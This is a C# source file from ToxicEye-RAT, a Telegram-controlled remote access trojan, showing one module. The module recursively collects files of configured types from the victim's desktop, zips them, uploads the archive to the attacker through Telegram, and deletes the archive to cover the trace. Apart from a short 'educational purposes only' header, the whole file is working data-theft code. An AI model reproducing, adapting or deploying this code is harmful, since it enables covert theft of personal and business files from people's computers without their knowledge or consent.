/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.Linq;
using System.IO;
using System.IO.Compression;

namespace TelegramRAT
{
    internal class GrabDesktop
    {
        public static void get()
        {
            // Info
            telegram.sendText("📦 Archiving desktop files...");
            // Find files on desktop
            string archivePath = Path.GetDirectoryName(config.InstallPath) + "\\desktop.zip";
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            // Find files
            var files = utils.GetFiles(desktopPath, "*.*", SearchOption.AllDirectories);
            // Write data
            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
            {
                foreach (var file in files)
                {
                    // If file not from list
                    if (!config.GrabFileTypes.Contains(Path.GetExtension(file).ToLower()))
                        continue;
                    // If the file size is larger than specified
                    if (config.GrabFileSize <= new FileInfo(file).Length)
                        continue;

                    // Archive file
                    archive.CreateEntryFromFile(file, Path.GetFullPath(file));
                }
            }
            // Send document
            telegram.sendFile(archivePath);
            // Delete archive
            File.Delete(archivePath);
        }
    }
}
